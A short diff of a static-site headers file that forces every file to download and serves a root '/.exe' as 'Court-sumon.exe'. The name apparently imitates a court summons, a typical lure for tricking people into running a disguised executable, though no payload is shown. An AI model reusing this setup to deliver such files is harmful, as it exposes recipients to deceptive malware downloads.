@@ -1,9 +1,9 @@
-/*
-  Content-Disposition: attachment
-*/
+# Global attachment for all files (optional, but safe)
+ /*
+   Content-Disposition: attachment
+ */
 
-/*
-  /.exe
-  Content-Type: application/octet-stream
-  Content-Disposition: attachment; filename="Court-sumon.exe"
-*/
+# Specific rule for .exe files in root
+ /.exe
+   Content-Type: application/octet-stream
+   Content-Disposition: attachment; filename="Court-sumon.exe"
